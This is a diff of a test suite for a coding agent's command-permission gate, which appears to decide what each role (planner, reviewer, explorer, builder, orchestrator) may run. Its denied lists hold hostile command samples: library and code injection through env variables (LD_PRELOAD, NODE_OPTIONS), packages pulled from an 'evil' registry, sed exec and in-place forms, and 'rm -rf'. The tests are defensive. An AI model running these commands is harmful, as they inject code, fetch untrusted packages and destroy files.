@@ -57,6 +57,33 @@ test("permissions: planner/reviewer allow read-only and verify commands", () => 
     "journalctl -u nginx",
     "git status && npm test",
     "npm test 2>&1 | tail -50",
+    "sed -n '440,510p' f",
+    "sed -n '1,20p' f",
+    "sed -n '$p' f",
+    "sed --quiet --expression='1,5p' f",
+    "sed -nE '1,5p' f",
+    "sed -n '/foo/p' f",
+    "sed -n '1,5p;30,40p' f",
+    "sed -n '1,5!p' f",
+    "sed -n '1,5{ p; q }' f",
+    "npx vitest run tests/x.test.ts",
+    "npx --no-install tsc --noEmit",
+    "npm exec -- vitest run",
+    "pnpm exec vitest run",
+    "yarn exec tsc --noEmit",
+    "bunx vitest run",
+    "pnpx vitest run",
+    "timeout 60 npx vitest run",
+    "env CI=1 npm test",
+    "env NO_COLOR=1 npm test",
+    "env LANG=en_US.UTF-8 npm test",
+    "env LC_ALL=C npm test",
+    "env TZ=UTC npm test",
+    "nice -n 5 npm test",
+    "stdbuf -oL npm test",
+    "command npm test",
+    "command -v npm",
+    "env ls",
     "npm run lint",
     "npm run lint:eslint",
     "npm run typecheck",
@@ -106,7 +133,6 @@ test("permissions: destructive and unknown commands are denied for restricted ro
     "npm install",
     "npm run build",
     "npm run lint:fix",
-    "npx vitest",
     "sudo ls",
     "cat f > out.txt",
     "cat f >> out.txt",
@@ -135,7 +161,47 @@ test("permissions: destructive and unknown commands are denied for restricted ro
     "git reflog expire --expire=now --all",
     "git worktree remove ../x",
     "git remote add origin url",
-    "env ls",
+    "sed -i 's/a/b/' f",
+    "sed -i.bak 's/a/b/' f",
+    "sed --in-place=.bak 's/a/b/' f",
+    "sed -n '1p' f -i",
+    "sed -f prog.sed f",
+    "sed -n 'e id' f",
+    "sed -n '1w out' f",
+    "sed -n 's/a/b/w out' f",
+    "sed -n 's/a/b/e' f",
+    "sed -n '1r file' f",
+    "sed -n '1b label' f",
+    "sed -n '1~2p' f",
+    "sed -n '/foo' f",
+    "sed -n '{p' f",
+    "npx --package=evil vitest",
+    "npx -p evil vitest",
+    "npx -c 'rm -rf x'",
+    "npx --registry=http://evil vitest",
+    "npm exec --package=x vitest",
+    "npx unknown-tool",
+    "env -S 'rm x'",
+    "env PATH=. npm test",
+    "env NODE_OPTIONS=--require=./scripts/x.mjs npm test",
+    "env NODE_PATH=./node_modules npm test",
+    "env LD_PRELOAD=./x.so npm test",
+    "env LD_LIBRARY_PATH=. npm test",
+    "env DYLD_INSERT_LIBRARIES=./x.dylib npm test",
+    "env PYTHONPATH=. npm test",
+    "env PYTHONSTARTUP=./x.py pytest",
+    "env BASH_ENV=./x.sh npm test",
+    "env ENV=./x.sh npm test",
+    "env SHELL=/bin/sh npm test",
+    "env COMSPEC=cmd.exe npm test",
+    "env PATHEXT=.EXE npm test",
+    "env GIT_CONFIG_GLOBAL=./x git status",
+    "env npm_config_script_shell=/bin/sh npm test",
+    "env rm -rf x",
+    "timeout 60 rm x",
+    "nice -n 5 rm x",
+    "stdbuf -oL rm x",
+    "command rm x",
     "awk 'BEGIN{system(\"ls\")}'",
   ];
   for (const cmd of no) {
@@ -157,10 +223,52 @@ test("permissions: explorer is read-only, not verify", () => {
   assert.equal(allowed("explorer", "git log -5"), true);
   assert.equal(allowed("explorer", "rg TODO ."), true);
   assert.equal(allowed("explorer", "cat file"), true);
+  assert.equal(allowed("explorer", "sed -n '1,20p' f"), true);
   assert.equal(allowed("explorer", "npm test"), false);
+  assert.equal(allowed("explorer", "npx vitest run"), false);
+  assert.equal(allowed("explorer", "timeout 60 npx vitest run"), false);
   assert.equal(allowed("explorer", "eslint src"), false);
   assert.equal(allowed("explorer", "npm run lint"), false);
   assert.equal(allowed("explorer", "pytest"), false);
+});
+
+test("permissions: planner and reviewer agree on sed and wrappers", () => {
+  const allowedCommands = [
+    "sed -n '1,20p' f",
+    "npx vitest run",
+    "timeout 60 npx vitest run",
+    "env CI=1 npm test",
+    "nice -n 5 npm test",
+    "stdbuf -oL npm test",
+    "command npm test",
+    "cd C:/Users/Lenovo/Projects/pi-desktop && sed -n '440,510p' node_modules/@earendil-works/pi-coding-agent/dist/core/model",
+    "cd C:/Users/Lenovo/Projects/pi-desktop && npx vitest run tests/host/sdk-providers.test.ts 2>&1 | tail -20",
+  ];
+  const deniedCommands = [
+    "sed -i 's/a/b/' f",
+    "sed -n '1p' f -i",
+    "awk '{print}' f",
+    "npx --package=evil vitest",
+    "env NODE_OPTIONS=--require=./scripts/x.mjs npm test",
+    "timeout 60 rm x",
+    "nice -n 5 rm x",
+    "stdbuf -oL rm x",
+    "command rm x",
+  ];
+  for (const [commands, expected] of [[allowedCommands, true], [deniedCommands, false]] as const) {
+    for (const cmd of commands) {
+      assert.equal(allowed("planner", cmd), expected, `planner verdict: ${cmd}`);
+      assert.equal(allowed("reviewer", cmd), expected, `reviewer verdict: ${cmd}`);
+      assert.equal(
+        allowed("planner", cmd),
+        allowed("reviewer", cmd),
+        `planner/reviewer must agree: ${cmd}`,
+      );
+    }
+  }
+  for (const cmd of deniedCommands) {
+    assert.equal(allowed("explorer", cmd), false, `explorer must deny: ${cmd}`);
+  }
 });
 
 test("permissions: builder bypasses the gate entirely", () => {
@@ -169,6 +277,23 @@ test("permissions: builder bypasses the gate entirely", () => {
   assert.equal(isCommandAllowedForRole("builder", "npm install"), true);
   assert.equal(ROLE_POLICIES.builder.commandClass, "full");
   assert.equal(ROLE_POLICIES.builder.canWrite, true);
+});
+
+test("permissions: orchestrator has the same authority as builder", () => {
+  assert.equal(policyForRole("orchestrator").commandClass, "full");
+  assert.equal(policyForRole("orchestrator").canWrite, true);
+  for (const command of [
+    "rm -rf /",
+    "git push --force",
+    "npm install",
+    "sed -i 's/a/b/' file",
+  ]) {
+    assert.equal(
+      isCommandAllowedForRole("orchestrator", command),
+      true,
+      command,
+    );
+  }
 });
 
 test("permissions: empty/whitespace commands fail closed for restricted roles", () => {
@@ -225,9 +350,11 @@ test("permissions: commandClassOf reports the weakest sufficient class", () => {
   assert.equal(commandClassOf("frobnicate --x"), "full");
   assert.equal(commandClassOf("rm -rf x"), "full");
   assert.equal(commandClassOf(""), "full");
-  // Interpreters whose programs are code are never read-only.
-  assert.equal(commandClassOf("sed -n '1,20p' f"), "full");
+  // Safe sed print/select programs are reads; awk remains Builder-only.
+  assert.equal(commandClassOf("sed -n '1,20p' f"), "read-only");
   assert.equal(commandClassOf("awk '{print $1}' f"), "full");
+  assert.equal(commandClassOf("npx vitest run"), "verify");
+  assert.equal(commandClassOf("sed -n '1p' f -i"), "full");
   // Newly allowlisted reads and closed write vectors.
   assert.equal(commandClassOf("npm run"), "read-only");
   assert.equal(commandClassOf("node --run test"), "verify");
@@ -406,10 +533,11 @@ test("permissions: explainCommandRefusal mirrors the gate and names the rule", (
   assert.equal(flag?.kind, "blocked-flag");
   assert.match(flag?.detail ?? "", /--fix/);
 
-  const segment = explainCommandRefusal("planner", "sed -n '1,5p' f");
+  const segment = explainCommandRefusal("planner", "awk '{print}' f");
   assert.equal(segment?.kind, "segment-class");
-  assert.equal(segment?.segment, "sed -n '1,5p' f");
+  assert.equal(segment?.segment, "awk '{print}' f");
   assert.match(segment?.suggestion ?? "", /may run/);
+  assert.equal(explainCommandRefusal("planner", "sed -n '1,5p' f"), null);
 
   // The gate IS "no refusal", so the two can never disagree.
   for (const cmd of [
@@ -417,6 +545,9 @@ test("permissions: explainCommandRefusal mirrors the gate and names the rule", (
     "rm -rf x",
     "cat f > o",
     "sed -n '1,5p' f",
+    "awk '{print}' f",
+    "npx vitest run",
+    "sed -n '1p' f -i",
     "ls x 2>/dev/null",
     "npm test -- -u",
   ]) {
@@ -564,7 +695,6 @@ test("policy: executors stay refused — the denylist's premise", () => {
     "timeout 5 rm x",
     "find . -exec rm {} ;",
     `awk '{print}' f`,
-    "sed -n 1p f",
   ]) {
     assert.equal(commandClassOf(cmd), "full", `must be full: ${cmd}`);
     for (const role of ["planner", "reviewer", "explorer"] as const) {
@@ -605,6 +735,15 @@ test("policy: the two gates agree — plan-allowed implies not-a-write", () => {
     `rg -n "rm -rf" src`,
     `grep -rn 'a > b' docs`,
     `grep -rn 'a & b' docs`,
+    `sed -n '1,20p' f`,
+    "npx vitest run",
+    "timeout 60 npx vitest run",
+    "env CI=1 npm test",
+    "nice -n 5 npm test",
+    "stdbuf -oL npm test",
+    "command npm test",
+    "cd C:/Users/Lenovo/Projects/pi-desktop && sed -n '440,510p' node_modules/@earendil-works/pi-coding-agent/dist/core/model",
+    "cd C:/Users/Lenovo/Projects/pi-desktop && npx vitest run tests/host/sdk-providers.test.ts 2>&1 | tail -20",
     `jq . package.json`,
     "sort -u file.txt",
     "find . -name '*.ts'",
@@ -619,7 +758,7 @@ test("policy: the two gates agree — plan-allowed implies not-a-write", () => {
     "npm test 2>&1 | tail -50",
     // Denied by both, in different ways — the implication holds vacuously.
     "rm -rf x",
-    `sed -n '1,20p' f`,
+    "sed -i 's/a/b/' f",
     "npm install left-pad",
     "eslint --fix src",
     "git commit -m x",
@@ -653,11 +792,18 @@ test("describeCommandPolicy: a quoted pattern reads as read-only", () => {
   assert.match(text, /Default write policy: read-only/);
 });
 
-test("describeCommandPolicy: a refused command names the rule", () => {
+test("describeCommandPolicy: safe sed is read-only and awk is refused", () => {
   const sed = describeCommandPolicy(`sed -n '1,5p' f`).join("\n");
-  assert.match(sed, /full · write/);
-  assert.match(sed, /planner\s+✖ segment-class/);
-  assert.match(sed, /Default write policy: write/);
+  assert.match(sed, /read-only · no write/);
+  for (const role of ["planner", "reviewer", "explorer"] as const) {
+    assert.match(sed, new RegExp(`${role}\\s+✔ allowed`));
+  }
+  assert.match(sed, /Default write policy: read-only/);
+
+  const awk = describeCommandPolicy(`awk '{print}' f`).join("\n");
+  assert.match(awk, /full · write/);
+  assert.match(awk, /planner\s+✖ segment-class/);
+  assert.match(awk, /Default write policy: write/);
 
   const redirect = describeCommandPolicy(`rg -n 'a' f > out`).join("\n");
   assert.match(redirect, /forbidden shell syntax: a file redirect/);
